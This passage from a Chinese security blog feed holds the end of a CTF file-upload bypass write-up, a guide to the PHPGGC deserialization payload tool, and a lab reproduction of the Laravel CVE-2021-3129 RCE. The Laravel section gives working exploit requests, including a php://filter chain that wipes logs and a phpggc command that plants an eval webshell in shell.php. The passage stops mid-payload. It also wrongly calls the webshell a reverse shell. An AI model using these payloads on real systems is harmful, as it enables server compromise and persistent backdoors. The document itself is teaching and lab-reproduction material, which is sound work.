punctuation">,</span><span class="token string double-quoted-string">".php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php1"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pht"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"pHp1"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aScx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aShx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cEr"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".sWf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".swf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换为小写</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除字符串::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//收尾去空</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'此文件不允许上传!'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>检测的逻辑跟<code>Pass-03</code>一样，就是ban掉的后缀太多了，想找到一个能用的比较难。那就不找了，就上传文件名合法的文件，然后通过覆盖配置文件，指定服务器将合法文件名（如.jpg）当作php文件解析，实现曲线救国。<br>       本来以为这一关会是单检测文件内容，但其实这种更好绕过，构造合法魔术头就行了，再难一点的其实是MIME+大黑名单后缀+内容检测。说白了如果检测手段多管齐下，想绕过肯定会更难。</p>]]></content>
      
      
      <categories>
          
          <category> CTF实战 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
            <tag> CTF-web </tag>
            
            <tag> buuoj </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化工具之PHPGGC</title>
      <link href="/2025/01/02/gong-fang-gong-ju-ku/fan-xu-lie-hua-gong-ju-zhi-phpggc/"/>
      <url>/2025/01/02/gong-fang-gong-ju-ku/fan-xu-lie-hua-gong-ju-zhi-phpggc/</url>
      
        <content type="html"><![CDATA[<h1 id="一、PHPGGC简介"><a href="#一、PHPGGC简介" class="headerlink" title="一、PHPGGC简介"></a>一、PHPGGC简介</h1><p>PHPGGC（PHP Generic Gadget Chains，PHP通用反序列化利用链）是一款能够自动生成主流框架序列化测试payload的工具。它类似于Java中的ysoserial工具，但专为PHP设计。PHPGGC支持多种框架，包括但不限于Doctrine, Guzzle, Laravel, Magento, Monolog, Phalcon, Slim, SwiftMailer, Symfony, Yii和ZendFramework等。该工具可以帮助安全研究人员和渗透测试人员在遇到PHP反序列化漏洞时，快速生成利用payload，而无需手动寻找和组合各种利用链。</p><blockquote><p>“Gadget” 这个单词在英语中通常指的是一种小型的机械设备或电子装置，它通常设计得非常精巧，用来执行特定的任务或功能。</p></blockquote><h1 id="二、主要特点"><a href="#二、主要特点" class="headerlink" title="二、主要特点"></a>二、主要特点</h1><ol><li><strong>广泛的payload覆盖</strong>：支持多种PHP框架和组件的反序列化漏洞利用。</li><li><strong>命令行界面</strong>：通过简单的命令行操作即可生成payload，方便快捷。</li><li><strong>PHAR文件支持</strong>：新增了对PHAR文件格式的支持，可以生成包含反序列化数据的PHAR文件。</li><li><strong>多格式文件生成</strong>：支持生成多格式文件（如JPEG/PHAR），方便在不同场景下使用。</li><li><strong>编码器支持</strong>：新增了多种编码器，如Base64编码、URL编码等，用户可以根据需要对生成的payload进行编码处理。</li><li><strong>快速销毁标志</strong>：新增了<code>--fast-destruct</code>标志，确保生成的对象在反序列化后立即销毁，提高利用的可靠性。</li></ol><h1 id="三、部署安装"><a href="#三、部署安装" class="headerlink" title="三、部署安装"></a>三、部署安装</h1><ul><li>访问PHPGGC的GitHub页面：<a href="https://github.com/ambionics/phpggc">https://github.com/ambionics/phpggc</a></li><li>git clone下载源代码并解压到Linux环境中（如Kali Linux或CentOS）。</li></ul><p>注意：运行phpggc 的条件是php cli的版本&gt;=5.6</p><img src="/2025/01/02/gong-fang-gong-ju-ku/fan-xu-lie-hua-gong-ju-zhi-phpggc/%E6%88%AA%E5%B1%8F2025-01-02%2013.26.18.png" style="zoom:35%;"><img src="/2025/01/02/gong-fang-gong-ju-ku/fan-xu-lie-hua-gong-ju-zhi-phpggc/%E6%88%AA%E5%B1%8F2025-01-02%2013.20.54.png" style="zoom:35%;"><h1 id="四、使用方法"><a href="#四、使用方法" class="headerlink" title="四、使用方法"></a>四、使用方法</h1><h2 id="4-1-查看可选项"><a href="#4-1-查看可选项" class="headerlink" title="4.1 查看可选项"></a>4.1 查看可选项</h2><ul><li>解压后进入安装目录，使用<code>php</code>命令运行PHPGGC，例如：<code>php phpggc -l</code>或者 <code>./phpggc -l</code>列出支持的所有可选项。</li></ul><img src="/2025/01/02/gong-fang-gong-ju-ku/fan-xu-lie-hua-gong-ju-zhi-phpggc/%E6%88%AA%E5%B1%8F2025-01-02%2013.21.46.png" style="zoom:35%;"><img src="/2025/01/02/gong-fang-gong-ju-ku/fan-xu-lie-hua-gong-ju-zhi-phpggc/%E6%88%AA%E5%B1%8F2025-01-02%2013.25.13.png" style="zoom:40%;"><p>通过./phpggc -l 可以列出所有可利用的组件，其中每条都包括组件的名称、版本范围、可利用其进行的操作(文件读写或RCE)、攻击向量(例如__destruct)</p><h2 id="4-2-过滤利用链"><a href="#4-2-过滤利用链" class="headerlink" title="4.2 过滤利用链"></a>4.2 过滤利用链</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./phpggc <span class="token parameter variable">-l</span> laravel<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/02/gong-fang-gong-ju-ku/fan-xu-lie-hua-gong-ju-zhi-phpggc/%E6%88%AA%E5%B1%8F2025-01-02%2013.29.31.png" style="zoom:30%;"><h2 id="4-3-其他使用方法"><a href="#4-3-其他使用方法" class="headerlink" title="4.3 其他使用方法"></a>4.3 其他使用方法</h2><ol><li><strong>显示组件相关信息</strong>： 使用命令 <code>./phpggc 组件名 -i</code> 可以显示与组件相关的信息，包括生成攻击payload所需要的参数。</li><li><strong>生成payload</strong>： 根据需要生成的payload，使用命令 <code>./phpggc 组件名 函数名 参数</code> 来生成。例如，生成Laravel/RCE1的payload需要提供函数名以及传给该函数的参数，使用命令 <code>./phpggc Laravel/RCE1 system id</code> 即可生成payload。</li><li><strong>文件写入需求</strong>： 对于只能满足写文件需求的组件，要利用必须知道网站的绝对路径。</li><li><strong>再次包装处理</strong>： PHPGGC中的 <code>-w</code> 参数还可以对序列化的数据进行再次包装处理。</li><li><strong>编码格式</strong>： 如果需要对生成的payload进行编码，比如base64编码或URL编码，可以直接在命令后面加上相应的参数来完成编码。例如，<code>./phpggc ThinkPHP/RCE3 system() "cat /flag" --base64</code>。</li></ol><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>PHPGGC是一个用于PHP反序列化漏洞利用的工具，它能够自动生成针对多种PHP框架的利用链payload。通过简单的命令行操作，用户可以快速列出支持的组件、查看详细信息，并生成攻击载荷。PHPGGC支持多种编码格式，适用于安全测试和渗透测试中的反序列化漏洞利用。</p>]]></content>
      
      
      <categories>
          
          <category> 攻防工具库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 攻防工具库 </tag>
            
            <tag> 反序列化漏洞利用 </tag>
            
            <tag> PHPGGC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laravel RCE CVE-2021-3129</title>
      <link href="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/"/>
      <url>/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/</url>
      
        <content type="html"><![CDATA[<h1 id="一、RCE-CVE-2021-3129漏洞概述"><a href="#一、RCE-CVE-2021-3129漏洞概述" class="headerlink" title="一、RCE CVE-2021-3129漏洞概述"></a>一、RCE CVE-2021-3129漏洞概述</h1><h2 id="1-1-漏洞简介"><a href="#1-1-漏洞简介" class="headerlink" title="1.1 漏洞简介"></a>1.1 漏洞简介</h2><p>CVE-2021-3129 是一个影响 Laravel 框架的远程代码执行（RCE）漏洞。当 Laravel 应用程序处于调试模式（Debug mode）时，由于 Laravel 自带的 Ignition 组件对 <code>file_get_contents()</code> 和 <code>file_put_contents()</code> 函数的不安全使用，攻击者可以通过发起恶意请求，构造恶意 Log 文件等方式触发 Phar 反序列化，最终造成远程代码执行。</p><h2 id="1-2-影响范围"><a href="#1-2-影响范围" class="headerlink" title="1.2 影响范围"></a>1.2 影响范围</h2><p> Laravel 版本 &lt;= 8.4.2 以及 Ignition &lt; 2.5.2 的系统。</p><h1 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h1><h2 id="2-1-环境部署"><a href="#2-1-环境部署" class="headerlink" title="2.1 环境部署"></a>2.1 环境部署</h2><h3 id="2-1-1-部署vulhub"><a href="#2-1-1-部署vulhub" class="headerlink" title="2.1.1 部署vulhub"></a>2.1.1 部署vulhub</h3><p>在centos7（192.168.52.3）部署vulhub漏洞环境。</p><blockquote><p>Vulhub是一个面向大众的开源漏洞靶场，无需docker知识，简单执行两条命令即可编译、运行一个完整的漏洞靶场镜像。旨在让漏洞复现变得更加简单，让安全研究者更加专注于漏洞原理本身。</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/vulhub/vulhub.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>大战bug：</p><p>fatal: unable to access ‘<a href="https://github.com/vulhub/vulhub.git/">https://github.com/vulhub/vulhub.git/</a>‘: Could not resolve host: github.com; Unknown error:</p><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2024-12-31%2016.41.18.png" style="zoom:50%;"><p>初步分析可能是因为之前搭建域渗透攻击环境时修改vmnet8（NAT网段）导致的，可是ping百度是可以连通的。需要修改一下。</p><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2024-12-31%2016.46.16.png" style="zoom:45%;"><p>DNS配置没问题。</p><p>github.com也无法ping通。</p><p>然后尝试将mac上的与github有关的hosts配置文件配置到/etc/hosts文件中，还是不行。</p><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2024-12-31%2016.50.18.png" style="zoom:50%;"><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2024-12-31%2016.53.07.png" style="zoom:40%;"><p>配置hosts：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">140.82</span>.112.3  github.com      <span class="token number">199.232</span>.5.194  github.global.ssl.fastly.net<span class="token number">54.231</span>.114.219  github-cloud.s3.amazonaws.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2024-12-31%2016.56.35.png" style="zoom:50%;"><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2024-12-31%2016.57.02.png" style="zoom:50%;"><p>github.com可以ping通了。</p><p>但是仍然无法git clone。</p><p>reboot之后重试：</p><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2024-12-31%2017.01.54.png" style="zoom:40%;"><p>fatal: unable to access ‘<a href="https://github.com/vulhub/vulhub.git/">https://github.com/vulhub/vulhub.git/</a>‘: Encountered end of file</p><p>将https改成http之后居然可以了。</p><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2024-12-31%2017.03.25.png" style="zoom:40%;"></blockquote><p>克隆完成后一级目录内的内容如下：</p><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2024-12-31%2017.14.53.png" alt="vulhub一级目录" style="zoom:50%;"><h3 id="2-1-2-启动Laravel"><a href="#2-1-2-启动Laravel" class="headerlink" title="2.1.2 启动Laravel"></a>2.1.2 启动Laravel</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> laravel/CVE-2021-3129/<span class="token function">docker</span> compose up <span class="token parameter variable">-d</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>大战bug：</p><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2024-12-31%2017.19.33.png" style="zoom:50%;"><p>分析可能是reboot重启之后，没有启动docker服务。</p><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2024-12-31%2017.20.46.png" style="zoom:50%;"></blockquote><p>重新执行<code>docker compose up -d</code></p><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2024-12-31%2017.21.43.png" style="zoom:50%;"><p>查看容器运行状态</p><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2024-12-31%2017.26.05.png" style="zoom:50%;"><p>访问测试：</p><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2024-12-31%2017.27.21.png" style="zoom:30%;"><h2 id="2-2-漏洞复现"><a href="#2-2-漏洞复现" class="headerlink" title="2.2 漏洞复现"></a>2.2 漏洞复现</h2><h3 id="2-2-1-漏洞存在性判别"><a href="#2-2-1-漏洞存在性判别" class="headerlink" title="2.2.1 漏洞存在性判别"></a>2.2.1 漏洞存在性判别</h3><p>Laravel环境搭建完成后，第一次访问首页，会出现报错“No application encryption key has been specified.”（未指定应用加密密钥）。其在下方给我们提供了一个修复方案（Ignition 组件提供）。点击页面中的“Generate app key”，会生成对应应用密钥，这里我们可以使用Brup Suite拦截该请求。</p><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2025-01-02%2013.41.28.png" style="zoom:40%;"><p>然后修改请求正文中的 solution 参数修改为 MakeViewVariableOptionalSolution ，如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">{</span>    <span class="token string">"solution"</span><span class="token builtin class-name">:</span> <span class="token string">"Facade<span class="token entity" title="\\">\\</span>Ignition<span class="token entity" title="\\">\\</span>Solutions<span class="token entity" title="\\">\\</span>MakeViewVariableOptionalSolution"</span>,    <span class="token string">"parameters"</span><span class="token builtin class-name">:</span> <span class="token punctuation">{</span>        <span class="token string">"variableName"</span><span class="token builtin class-name">:</span> <span class="token string">"asabcde"</span>,        <span class="token string">"viewFile"</span><span class="token builtin class-name">:</span> <span class="token string">"xx1111111xx"</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发送修改后的请求，若返回500，且提示file_get_contents()的报错时，则有此漏洞。</p><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2025-01-02%2013.43.04.png" style="zoom:40%;"><h3 id="2-2-2-step1-清空laravel日志"><a href="#2-2-2-step1-清空laravel日志" class="headerlink" title="2.2.2 step1:清空laravel日志"></a>2.2.2 step1:清空laravel日志</h3><p>执行过上述漏洞存在性判别之后，laravel.log中会记录日志，可以从路径/var/www/storage/logs/laravel.log中看到。</p><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2025-01-02%2013.49.59.png" style="zoom:40%;"><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2025-01-02%2013.51.52.png" style="zoom:40%;"><p>访问/_ignition/execute-solution，使用Brup拦截请求，修改请求方法为POST，修改Content-Type为 application/json，添加如下请求正文，发送请求，清空laravel日志。</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span> <span class="token property">"solution"</span><span class="token operator">:</span> <span class="token string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="token punctuation">,</span> <span class="token property">"parameters"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token property">"variableName"</span><span class="token operator">:</span> <span class="token string">"xxxxx"</span><span class="token punctuation">,</span> <span class="token property">"viewFile"</span><span class="token operator">:</span> <span class="token string">"php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2025-01-02%2013.54.20.png" style="zoom:67%;"><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2025-01-02%2013.55.04.png" style="zoom:50%;"><p>可以看到日志已经被清空了。利用的原理是php://filter 中的 convert.base64-decode 过滤器的特性，convert.base64-decode过滤器会将一些非base64字符给过滤掉后再进行base64解码，于是我们可以将日志文件中的所有内容转换成非base64编码出现的字符，然后再使用 convert.base64-decode 过滤器读取，此时读取到的内容就为空，最终达到清空日志文件的目的。</p><h3 id="2-2-3-step2-基于phpggc生成payload"><a href="#2-2-3-step2-基于phpggc生成payload" class="headerlink" title="2.2.3 step2:基于phpggc生成payload"></a>2.2.3 step2:基于phpggc生成payload</h3><p>用phpggc指定利用链为Laravel/RCE5生成反序列化利用的POC，此处为写入一句话木马到shell.php中。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// 将一句话木马 <span class="token operator">&lt;</span>?php  eval<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">&gt;</span> base64编码PD9waHAgIGV2YWwoJF9QT1NUW2FdKTs/Pg<span class="token operator">==</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">php <span class="token parameter variable">-d</span> <span class="token string">"phar.readonly=0"</span> ./phpggc Laravel/RCE5 <span class="token string">"system('echo PD9waHAgIGV2YWwoJF9QT1NUW2FdKTs/Pg==|base64 -d &gt; /var/www/html/shell.php');"</span> <span class="token parameter variable">--phar</span> phar <span class="token parameter variable">-o</span> php://output <span class="token operator">|</span> base64 <span class="token parameter variable">-w</span> <span class="token number">0</span> <span class="token operator">|</span> python <span class="token parameter variable">-c</span> <span class="token string">"import sys;print(''.join(['=' + hex(ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>详解：</p><ol><li><code>php -d "phar.readonly=0"</code>：<ul><li>这个部分是启动PHP CLI时的一个配置选项，<code>phar.readonly=0</code> 允许修改PHAR文件。PHAR文件是PHP归档文件，可以包含PHP脚本和数据。</li></ul></li><li><code>./phpggc Laravel/RCE5</code>：<ul><li>这是调用PHPGGC工具的命令，<code>Laravel/RCE5</code> 指的是Laravel框架中的一个特定的反序列化漏洞（RCE，远程代码执行）。</li></ul></li><li><code>"system('echo PD9waHAgIGV2YWwoJF9QT1NUW2FdKTs/Pg==|base64 -d &gt; /var/www/html/shell.php');"</code>：<ul><li>这是一个系统命令，用于在目标服务器上执行。它首先将base64编码的字符串解码并重定向输出到<code>/var/www/html/shell.php</code>文件中。这个base64字符串解码后是一个PHP代码，用于创建一个反向shell。</li></ul></li><li><code>--phar phar</code>：<ul><li>这个选项告诉PHPGGC生成一个PHAR文件。</li></ul></li><li><code>-o php://output</code>：<ul><li>这个选项将命令的输出发送到PHP的输出流。</li></ul></li><li><code>| base64 -w 0</code>：<ul><li>这个管道命令将PHPGGC的输出进行base64编码，<code>-w 0</code> 参数表示不换行。</li></ul></li><li><code>| python -c "import sys;print(''.join(['=' + hex(ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"</code>：<ul><li>这个管道命令使用Python将base64编码的数据转换为一个URL安全的base64编码字符串，并且每个字节后面都添加了<code>=00</code>，这是一种常见的编码技巧，用于绕过某些安全机制。</li></ul></li></ol><p>这个命令的最终目的是生成一个经过特殊编码的PHAR文件，该文件在被目标服务器反序列化时，会执行一个系统命令，创建一个反向shell。</p></blockquote><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2025-01-02%2014.00.24.png" style="zoom:50%;"><h3 id="2-2-4-step3-发送无害payload"><a href="#2-2-4-step3-发送无害payload" class="headerlink" title="2.2.4 step3:发送无害payload"></a>2.2.4 step3:发送无害payload</h3><p>发送AA生成无害paylaod，进行方便后续补齐。</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span> <span class="token property">"solution"</span><span class="token operator">:</span> <span class="token string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="token punctuation">,</span> <span class="token property">"parameters"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token property">"variableName"</span><span class="token operator">:</span> <span class="token string">"xxxxx"</span><span class="token punctuation">,</span> <span class="token property">"viewFile"</span><span class="token operator">:</span> <span class="token string">"AA"</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-2-5-step4-发送payload"><a href="#2-2-5-step4-发送payload" class="headerlink" title="2.2.5 step4:发送payload"></a>2.2.5 step4:发送payload</h3><p>发送POC至服务器，注意要在viewFile的最后添加一个字母a。</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span> <span class="token property">"solution"</span><span class="token operator">:</span> <span class="token string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="token punctuation">,</span> <span class="token property">"parameters"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token property">"variableName"</span><span class="token operator">:</span> <span class="token string">"xxxxx"</span><span class="token punctuation">,</span> <span class="token property">"viewFile"</span><span class="token operator">:</span> <span class="token 